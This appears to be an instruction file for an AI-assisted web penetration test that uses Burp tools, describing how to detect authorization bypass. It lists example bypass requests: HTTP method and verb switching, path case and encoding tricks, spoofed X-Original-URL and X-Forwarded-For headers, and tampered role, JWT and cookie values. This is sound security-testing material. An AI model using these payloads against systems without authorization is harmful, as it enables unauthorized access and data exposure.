# Authorization Bypass Detection

## Objective

Detect authorization bypass vulnerabilities where access control checks can be circumvented, allowing unauthorized actions regardless of object ownership.

## Difference from IDOR

| IDOR (CWE-639) | Authorization Bypass (CWE-284) |
|----------------|-------------------------------|
| Access other users' objects | Bypass role/permission checks |
| Manipulate object references | Circumvent access control logic |
| Horizontal/vertical privilege | Missing or flawed authz checks |

## Typical bypass techniques

### 1. HTTP Method manipulation

```
GET /admin/users -> 403 Forbidden
POST /admin/users -> 200 OK
PUT /admin/users -> 200 OK
```

### 2. Path manipulation

**Case variation:**
```
/admin/users -> 403
/Admin/Users -> 200 OK
/ADMIN/USERS -> 200 OK
```

**Path traversal in URL:**
```
/user/profile -> 200 OK (allowed)
/user/../admin/users -> 200 OK (bypass!)
```

**URL encoding:**
```
/admin/users -> 403
/%61dmin/users -> 200 OK
/admin%2fusers -> 200 OK
```

**Double encoding:**
```
/admin/users -> 403
/%2561dmin/users -> 200 OK
```

### 3. Header manipulation

**X-Original-URL / X-Rewrite-URL:**
```
GET / HTTP/1.1
X-Original-URL: /admin/users
-> 200 OK (bypass!)
```

**X-Forwarded-For spoofing:**
```
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
-> 200 OK (IP whitelist bypass)
```

**Custom headers:**
```
X-Custom-IP-Authorization: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
```

### 4. Role/privilege manipulation

**Parameter tampering:**
```
POST /api/user/update
{"role": "admin"}
```

**JWT claim manipulation:**
```
{"role": "user"} -> {"role": "admin"}
{"isAdmin": false} -> {"isAdmin": true}
```

**Cookie manipulation:**
```
admin=0 -> admin=1
role=user -> role=administrator
```

### 5. Forced browsing

```
/user/dashboard -> 200 OK
/admin/dashboard -> Check if accessible without admin role
/api/admin/config -> Check hidden endpoints
```

### 6. HTTP verb tampering

```
DELETE /api/user/123 -> 403 (blocked)
POST /api/user/123?_method=DELETE -> 200 OK (bypass!)
```

**Common method override parameters:**
- `_method`
- `X-HTTP-Method-Override` header
- `X-Method-Override` header

### 7. Multi-step process bypass

```
Step 1: /checkout -> validates payment
Step 2: /confirm -> finalizes order

Direct access to Step 2 without Step 1?
-> Order confirmed without payment!
```

## Test steps

1. **Identify protected resources**
   - Admin panels, dashboards
   - API endpoints with role requirements
   - Multi-step workflows

2. **Map access control matrix**
   - What roles exist?
   - What can each role access?
   - Where are the boundaries?

3. **Test bypass techniques**
   - Method switching
   - Path manipulation
   - Header injection
   - Parameter tampering

4. **Verify the bypass**
   - Did the action succeed?
   - Was unauthorized data exposed?
   - Was state modified?

## Document the finding

If vulnerable:
```
1. burp_cvss_calculate(...) to get the vector
2. burp_create_finding(
     title: "Authorization Bypass on [endpoint/feature]",
     vuln_type: "authz-bypass",
     cvss_vector: "<from calculator>",
     description: "...",
     include_selection: true
   )
```

## Vulnerability indicators

- Actions succeed despite missing role/permissions
- Different response for same resource via different paths
- Access control only on client side
- Missing authorization checks on API endpoints

## Protection indicators

- Consistent 403/401 responses across all bypass attempts
- Server-side role verification on every request
- Centralized authorization middleware
- Proper HTTP method restrictions
